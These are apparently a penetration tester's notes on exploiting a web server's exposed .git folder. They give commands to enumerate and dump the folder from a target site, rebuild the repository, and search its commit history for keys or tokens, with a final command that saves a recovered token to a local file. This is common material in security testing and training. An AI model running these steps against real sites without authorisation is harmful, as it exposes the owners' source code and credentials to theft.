# GIT TOOLS

### Git tools are used when we locate an exposed .git folder that contains an entire repository with possibly sensitive information.

## TIP: USE THE COMMON.TXT WORDLIST TO SUCCESSFULLY ENUMERATE THE .GIT FOLDER!

## STEPS:

#### 1) 

    gitdumper.sh http://WHATEVER/.git/ repo

## Alternate method: wget

    wget -r http://DOMAIN.COM/.git

#### 2) Go to the directory where the .git folder is located

#### 3) 

    /path/to/extractor.sh . App

#### 4) Gets all commits in the repository

    git log 

#### 5) Show all branches a repository has

    git branch -a 

#### 6) See the specific commit in detail

    git show COMMIT_NUMBER 

#### 7) Switch to another branch

    git checkout BRANCH 

#### 8) Check in which branch are we now

    git branch 

#### 9) If we found a file/key/token, we can check the filename upon seeing the commit, then we store it locally with this command

    git show COMMIT_NUMBER^:FILE.json > token.json 
